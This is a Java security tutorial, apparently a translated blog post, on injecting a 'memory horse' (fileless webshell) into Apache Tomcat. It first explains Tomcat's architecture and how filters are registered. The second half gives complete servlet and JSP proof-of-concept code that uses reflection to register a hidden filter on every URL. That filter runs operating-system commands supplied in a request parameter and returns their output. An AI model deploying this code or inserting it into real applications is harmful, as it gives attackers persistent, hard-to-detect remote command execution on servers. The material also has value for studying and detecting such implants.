# Java Security Learning—Tomcat Memory Horse Series (I)

Author: H3rmesk1t

Data: 2022.08.14

# Tomcat Architecture Analysis
## Introduction

`Tomcat` is a free open source `Servlet` container, which is an implementation of the `Servlet` specification, also known as the `Servlet` engine. In order to better handle requests from clients, `Tomcat` designed a set of fully functional processing engines, including module functions such as `Container`, `Engine`, `Host`, `Context`, `Wrapper`, and other module functions.

As a `Web` server, `Tomcat` implements two very core functions:
 - `HTTP` server function: performs `Socket` communication (based on `TCP/IP`), parses `HTTP` packets.
 - `Servlet` container function: Loading and managing `Servlet`, `Servlet` is specifically responsible for handling `Request` requests.

<div align=center><img src="./images/2.png"></div>

The above two functions correspond to the two core component connectors (`Connector`) and container (`Container`) of `Tomcat` respectively. The connector is responsible for external communication (completes the `HTTP` server function), and the container is responsible for internal processing (completes the `Servlet` container function).

<div align=center><img src="./images/1.png"></div>

## Architecture composition

<div align=center><img src="./images/1.jpeg"></div>

Meaning of each component:
 - `Server`: i.e. `Web` server, one `Server` includes multiple `Service`.

 - `Service`: The function of `Service` is to combine `Connector` and `Engine` to provide services to the outside world. A Service can contain multiple `Connector`, but can only contain one `Engine`, where the function of `Connector` is to receive requests from the client, and the function of `Engine` is to process received requests.

 - `Connector`: The connection component of `Tomcat Engine` supports three protocols, namely `HTTP/1.1`, `HTTP/2.0` and `AJP`.

 - `Container`: Responsible for encapsulating and managing `Servlet` to process user `servlet` requests, encapsulating `Socket` data into `Request`, and passing it to `Engine` for processing.

 - `Engine`: Top-level container, cannot be included by other containers, it accepts all requests to process the connector and returns the response to the corresponding connector. Multiple virtual hosts can be configured under `Engine`, each virtual host has a domain name. When `Engine` obtains a request, it matches the request to a `Host` and then handes the request to the `Host` for processing. `Engine` has a default virtual host. When the request cannot match any `Host`, it will be handed over to the default `Host` for processing.

 - `Host`: Represents a virtual host. Each virtual host matches a certain network domain name `Domain Name`. One or more `Web Apps` can be deployed (`deploy`) under each virtual host. Each `Web App` corresponds to a `Context`.

 - `Context`: Represents a `Web` application, which is the parent container of `Servlet` and `Filter`. A `Context` corresponds to a `Web Application`, and a `WebApplication` consists of one or more `Servlets`.

 - `Wrapper`: represents a `Servlet`, which is responsible for managing the life cycle of `Servlet`, including loading, initialization, resource recycling, etc., and provides a convenient mechanism to use interceptors.


## Connector
The `Connector` connector mainly completes the following three core functions:
 - `Socket` communication.
 - parse the application layer protocol and encapsulate it into a `Request` request.
 - Convert `Request` request to `ServletRequest` and `Response` to `ServletResponse`.

There are multiple components included in the Connector, and the Connector uses the ProtocolHandler processor to handle the request. Different `ProtocolHandler` represents different connection types. The `ProtocolHandler` processor can be regarded as a protocol processing coordinator, implementing the processing of requests by managing other working components. `ProtocolHandler` contains three very important components, which correspond to the three core functions of the `Connector` connector:
  - `Endpoint`: Responsible for receiving and processing `socket` network connections.
  - Processor: Responsible for encapsulating the socket connection received from `Endpoint` into `request` according to the protocol type.
  - `Adapter`: Responsible for handing over the encapsulated `Request` to the `Container` for processing and parsing it into an object that can be called by the `Container` that inherits the `ServletRequest` interface and `ServletResponse` interface.

<div align=center><img src="./images/3.png"></div>


## Container
The `Container` container is a module responsible for encapsulating and managing `Servlet`, processing user's `servlet` requests, and returning objects to `web` users. The `Container` component is also called `Catalina`, which is the core of `Tomcat`. In `Container`, there are `4` containers, namely `Engine`, `Host`, `Context`, and `Wrapper`.

<div align=center><img src="./images/4.png"></div>

<div align=center><img src="./images/5.png"></div>

The functions of four containers:
 - `Engine` represents the entire `Catalina` `Servlet` engine, used to manage multiple virtual sites. A `Service` can only have one `Engine` at most, but an engine can contain multiple `Host`. The implementation class is `org.apache.catalina.core.StandardEngine`.
 - `Host` represents a virtual host, or a site. You can configure multiple virtual host addresses for `Tomcat`, and a virtual host can contain multiple `Context`. The implementation class is `org.apache.catalina.core.StandardHost`.
 - `Context` represents a `Web` application, each `Context` has a unique `path`, and a `Web` application can contain multiple `Wrappers`. The implementation class is `org.apache.catalina.core.StandardContext`.
 - `Wrapper` represents a `Servlet`, responsible for managing the entire `Servlet` life cycle, including loading, initialization, resource recycling, etc. The implementation class is `org.apache.catalina.core.StandardWrapper`.

<div align=center><img src="./images/6.png"></div>

When the `Container` handles the request, it is processed internally using the `Pipeline-Value` pipeline. Each `Pipeline` has a specific `Value`, that is, `BaseValue`, which will be executed at the end. The BaseValue of the upper container will call the pipeline of the lower container. `FilterChain` is actually this pattern. `FilterChain` is equivalent to `Pipeline`, and each `Filter` is equivalent to a `Value`. The `BaseValve` of `4` containers are `StandardEngineValve`, `StandardHostValve`, `StandardContextValve` and `StandardWrapperValve`.

<div align=center><img src="./images/8.png"></div>

<div align=center><img src="./images/7.png"></div>

## Filter chain
Multiple Filter programs can be registered in a `Web` application, and each `Filter` program can be intercepted for a certain `URL`. If multiple Filter programs intercept the same URL, then these Filters will form a Filter chain, also known as filter chain.

<div align=center><img src="./images/9.png"></div>

When configuring `Filter`, assuming that the execution will come to the next `Filter`, if `FilterChain.doFilter` is released, the `servlet` content will be executed at this time. The overall execution process is shown in the figure below:

<div align=center><img src="./images/10.png"></div>

### ServletContext
A ServletContext interface specified in the `javax.servlet.ServletContextServlet` specification provides a view of all `Servlets` of the `Web` application, through which you can access various resources and functions of a `Web` application. When the `WEB` container is started, it creates a corresponding `ServletConte for each `Web` application.
xt`, which represents the current `Web` application, and it is shared by all clients.

In the figure below, you can see that the `ServletContext` methods include `addFilter`, `addServlet`, `addListener` and other methods, that is, add `Filter`, `Servlet`, `Listener`, etc.

<div align=center><img src="./images/11.png"></div>

### ApplicationContext
In the `org.apache.catalina.core.ApplicationContext`, for the `Tomcat` container, in order to meet the `Servlet` specification, an implementation of the `ServletContext` interface must be included. Therefore, the `Tomcat``Context` container will contain an `ApplicationContext`.

### StandardContext
The default implementation of the `org.apache.catalina.Context` interface is `StandardContext`, and `Context` represents a `Web` application in `Tomcat`. The methods implemented by `ApplicationContext` are actually called methods in `StandardContext`. `StandardContext` is the `Context` that really works in `Tomcat`.


# Filter Memory Horse
## analyze
Follow up on `StandardContext` and let's take a look at how to load the registration of `Filter` in `Tomcat`. As you can see in the figure below, the `startInternal` method will start the `listener` first, then the `Filter`, and finally the `Servlet`.

<div align=center><img src="./images/12.png"></div>

Follow up on `filterStart`, now clear `filterConfigs`, then traverse `filterDefs` to get the `key` and `value`, and encapsulate the `value` into `ApplicationFilterConfig` object together with `key`.

<div align=center><img src="./images/13.png"></div>

Set a breakpoint at `filterChain.doFilter(servletRequest, servletResponse);` to see the call process.

<div align=center><img src="./images/14.png"></div>

```java
doFilter:20, DemoFilter
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
invoke:197, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:541, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:135, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:687, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:359, CoyoteAdapter (org.apache.catalina.connector)
service:399, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:889, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1743, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:745, Thread (java.lang)
```

In the `ApplicationFilterChain#internalDoFilter`, first get the `filter` object from `filterConfig`, and then call `filter.doFilter` to call the custom `filter.doFilter` method.

<div align=center><img src="./images/15.png"></div>

Continue to upload and trace back, you can see that two `ApplicationFilterConfig` type `filter` are stored in `StandardWrapperValve#invoke`, and the first `filter` was created by ourselves.

<div align=center><img src="./images/16.png"></div>

Follow up on the `filterChain` variable, you can see that it calls the `ApplicationFilterFactory#createFilterChain` method and gets an `ApplicationFilterChain` object.

<div align=center><img src="./images/17.png"></div>

Follow up on `ApplicationFilterFactory#createFilterChain`, first get `Request`, then use `getFilterChain` to get `filterChain`. Then go down and get the `filterMaps` through the `StandardContext` object's `findFilterMaps` method, then traverse the obtained `filterMaps`, and add `FilterConfig` to `filterChain` through the `ApplicationFilterChain#addFilter` method.

<div align=center><img src="./images/18.png"></div>

<div align=center><img src="./images/19.png"></div>

Next, let’s take a look at three member variables related to `Filter`:
 - `filterMaps` variable: Contains the `URL` mapping relationship of all filters.
 - `filterDefs` variable: contains all filters, including variables inside instances, etc.
 - `filterConfigs` variable: contains all `filterDef` information and filter instances corresponding to the filter, and filter management.

<div align=center><img src="./images/20.png"></div>

Since these three member variables are related to `Filter`, then to construct the `Filter` type memory horse, you should modify these three variables in the `StandardContext` object. Let’s see how to modify these three variables:
 - For the `filterMaps` variable, there are the `StandardContext#addFilterMap` method and the `StandardContext#addFilterMapBefore` method.

<div align=center><img src="./images/21.png"></div>

 - For the `filterConfigs` variable, follow up with the `StandardContext#filterStart` method, which has been analyzed above, initializes `filterConfigs` by traversing the key-value pairs of `filterDefs`.

 - For the `filterDefs` variable, follow the `StandardContext#addFilterDef` method and trace the next breakpoint forward there. The ContextConfig#configureStart method will be called, and the `webxml` parser is used to parse `web.xml`, and then store it in the `webxml` variable. Then call the `ContextConfig#configureContext` method to obtain the `filter` in `web.xml`, traverse it and then call the `StandardContext#addFilterDef` method.
Pass `filterName` and `filterDef` into the `filterDefs` variable in the `StandardContext#addFilterDef` method.

```java
addFilterDef:3010, StandardContext (org.apache.catalina.core)
configureContext:1450, ContextConfig (org.apache.catalina.startup)
webConfig:1329, ContextConfig (org.apache.catalina.startup)
configureStart:986, ContextConfig (org.apache.catalina.startup)
......
```

<div align=center><img src="./images/22.png"></div>

<div align=center><img src="./images/23.png"></div>

<div align=center><img src="./images/24.png"></div>

## Dynamically add Filter
According to the above analysis process, the dynamic addition of a `Filter` process is roughly as follows:
 - Get `standardContext`.
 - Create `Filter`.
 - Encapsulate the Filter object with `filterDef` and add `filterDef` to `filterDefs`.
 - Create `filterMap`, bind `url` and `filter` and add to `filterMaps`.
 - Encapsulate the `filterDef` object with `ApplicationFilterConfig` and add it to `filterConfigs`.

### Get standardContext
`standardContext` is mainly responsible for managing the loading and uninstallation of `session`, `cookies`, and `Servlet`, so it is saved in many places in `Tomcat`. If we can directly obtain `request`, we can use the following method to directly obtain `context`. At startup, Tomcat creates a ServletContext object for each `Context`, representing a `Context`, so that `ServletContext` can be converted into `StandardContext`.

```java
ServletContext servletContext = request.getSession().getServletContext();
Field appContext = servletContext.getClass().getDeclaredField("context");
appContext.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);

Field stdContext = applicationContext.getClass().getDeclaredField("context");
stdContext.setAccessible(true);
StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);
```

<div align=center><img src="./images/25.png"></div>

### Create Filter
To directly implement the `Filter` instance in the code, three important methods need to be rewrite: `init`, `doFilter`, and `destory`.

```java
Filter filter = new Filter() {

    @Override
    public void init(FilterConfig filterConfig) {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {

        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
        if (httpServletRequest.getParameter("cmd") != null) {
            InputStream inputStream = Runtime.getRuntime().exec(httpServletRequest.getParameter("cmd")).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
            String output = scanner.hasNext() ? scanner.next() : "";
            servletResponse.getWriter().write(output);
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
};
```

### Create filterDef encapsulate Filter object
The following code fuses the memory horse into the deserialized `payload`, so reflection is used here to obtain the `FilterDef` object. If you are using `jsp` or non-deserialization, you can directly use `new` to create the object.

```java
Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
Constructor filterDefDeclaredConstructor = FilterDef.getDeclaredConstructor();
FilterDef filterDef = (FilterDef) filterDefDeclaredConstructor.newInstance();
filterDef.setFilter(filter);
filterDef.setFilterName(FilterName);
filterDef.setFilterClass(filter.getClass().getName());
standardContext.addFilterDef(filterDef);
```

### Create filterMap binding URL
Create an instance of `FilterMap` through reflection. This part of the code mainly registers the effective route of `filter` and adds the `FilterMap` object to the first of the `FilterMaps` variable in `standardContext`.

```java
Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
Constructor filterMapDeclaredConstructor = FilterMap.getDeclaredConstructor();
FilterMap filterMap = (FilterMap) filterMapDeclaredConstructor.newInstance();
filterMap.addURLPattern("/*");
filterMap.setFilterName(FilterName);
filterMap.setDispatcher(DispatcherType.REQUEST.name());
standardContext.addFilterMapBefore(filterMap);
```

### Get the `filterConfigs` variable and add the `filterConfig` object
First get the filterConfigs variable stored in the `standardContext`, then generate the `ApplicationFilterConfig` object through reflection and put it in the `filterConfigs hashMap`.

```java
Configs = standardContext.getClass().getDeclaredField("filterConfigs");
Configs.setAccessible(true);
filterConfigs = (Map) Configs.get(standardContext);
```

```java
Class<?> Application
FilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
Constructor<?> applicationFilterConfigDeclaredConstructor = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);
applicationFilterConfigDeclaredConstructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef);
filterConfigs.put(FilterName, filterConfig);
```

## POC
### Java version

```java
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.apache.catalina.core.ApplicationFilterConfig;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.Scanner;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/8/15 9:55 pm
 */

@WebServlet("/exploitServlet")
public class exploitServlet extends HttpServlet {

    protected void doGet(HttpServletRequest request, HttpServletResponse response) {

        this.doPost(request, response);
    }

    protected void doPost(HttpServletRequest request, HttpServletResponse response) {

        Field Configs = null;
        Map filterConfigs;
        try {
            ServletContext servletContext = request.getSession().getServletContext();
            Field appContext = servletContext.getClass().getDeclaredField("context");
            appContext.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);

            Field stdContext = applicationContext.getClass().getDeclaredField("context");
            stdContext.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);

            String FilterName = "H3rmesk1t_Filter";
            Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(FilterName) == null) {
                Filter filter = new Filter() {

                    @Override
                    public void init(FilterConfig filterConfig) {

                    }

                    @Override
                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {

                        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
                        if (httpServletRequest.getParameter("cmd") != null) {
                            InputStream inputStream = Runtime.getRuntime().exec(httpServletRequest.getParameter("cmd")).getInputStream();
                            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
                            String output = scanner.hasNext() ? scanner.next() : "";
                            servletResponse.getWriter().write(output);
                            return;
                        }
                        filterChain.doFilter(servletRequest, servletResponse);
                    }

                    @Override
                    public void destroy() {

                    }
                };

                Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                Constructor filterDefDeclaredConstructor = FilterDef.getDeclaredConstructor();
                FilterDef filterDef = (FilterDef) filterDefDeclaredConstructor.newInstance();
filterDef.setFilter(filter);
                filterDef.setFilterName(FilterName);
                filterDef.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(filterDef);

                Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                Constructor filterMapDeclaredConstructor = FilterMap.getDeclaredConstructor();
                FilterMap filterMap = (FilterMap) filterMapDeclaredConstructor.newInstance();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName(FilterName);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap);

                Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                Constructor<?> applicationFilterConfigDeclaredConstructor = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);
                applicationFilterConfigDeclaredConstructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef);
                filterConfigs.put(FilterName, filterConfig);

                response.getWriter().write("Inject Successfully!");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

<div align=center><img src="./images/26.png"></div>

<div align=center><img src="./images/27.png"></div>

### JSP version

```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.PushbackInputStream" %><%--
  Created by IntelliJ IDEA.
  User: h3rmesk1t
  Date: 2022/8/15
  Time: 1:32 pm
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
  <head>
    <title>Filter</title>
  </head>
  <body>
    <%
      Field requestFiled = request.getClass().getDeclaredField("request");
      requestFiled.setAccessible(true);
      Request req = (Request) requestFiled.get(request);
      StandardContext standardContext = (StandardContext) req.getContext();

      Field configs = standardContext.getClass().getDeclaredField("filterConfigs");
      configs.setAccessible(true);
      Map filterConfigs = (Map) configs.get(standardContext);

      String FilterName = "H3rmesk1t_Filter";
      if (filterConfigs.get(FilterName) == null) {
        Filter filter = new Filter() {
          @Override
          public void init(FilterConfig filterConfig) {

          }

          @Override
          public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            if (httpServletRequest.getParameter("jsp") != null) {
              boolean isLinux = true;
              String osType = System.getProperty("os.name");
              if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;
              }

              String[] cmds = isLinux ? new String[] {
                      "sh",
                      "-c",
                      httpServletRequest.getParameter("jsp")
              } : new Strin
g[] {
                      "cmd.exe",
                      "/c",
                      httpServletRequest.getParameter("jsp")
              };

              InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
              Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
              String output = scanner.hasNext() ? scanner.next() : "";
              servletResponse.getWriter().write(output);
              servletResponse.getWriter().flush();
              return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
          }

          @Override
          public void destroy() {

          }
        };

        Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
        Constructor filterDefDeclaredConstructor = FilterDef.getDeclaredConstructor();
        FilterDef filterDef = (FilterDef) filterDefDeclaredConstructor.newInstance();
        filterDef.setFilter(filter);
        filterDef.setFilterName(FilterName);
        filterDef.setFilterClass(filter.getClass().getName());
        standardContext.addFilterDef(filterDef);

        Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        Constructor filterMapDeclaredConstructor = FilterMap.getDeclaredConstructor();
        FilterMap filterMap = (FilterMap) filterMapDeclaredConstructor.newInstance();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(FilterName);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        standardContext.addFilterMapBefore(filterMap);

        Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
        Constructor<?> applicationFilterConfigDeclaredConstructor = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);
        applicationFilterConfigDeclaredConstructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) applicationFilterConfigDeclaredConstructor.newInstance(standardContext, filterDef);
        filterConfigs.put(FilterName, filterConfig);

        System.out.print("Inject Successfully!");
      }
    %>
  </body>
</html>
```

<div align=center><img src="./images/28.png"></div>


# refer to

 - [Tomcat introduction-Y4tacker](https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Tomcat/Tomcat%E4%BB%8B%E7%BB%8D/Tomcat%E4%BB%8B%E7%BB%8D.md)

 - [Tomcat Memory Horse Technical Analysis (I) - Filter Type](https://www.anquanke.com/post/id/266240#h3-16)

 - [Java security based on Tomcat to implement memory horse](https://www.cnblogs.com/nice0e3/p/14622879.html)

 - [JAVA Memory Horse](https://www.yongsheng.site/2022/05/08/%E5%86%85%E5%AD%98%E9%A9%AC(%E4%B8%80)/)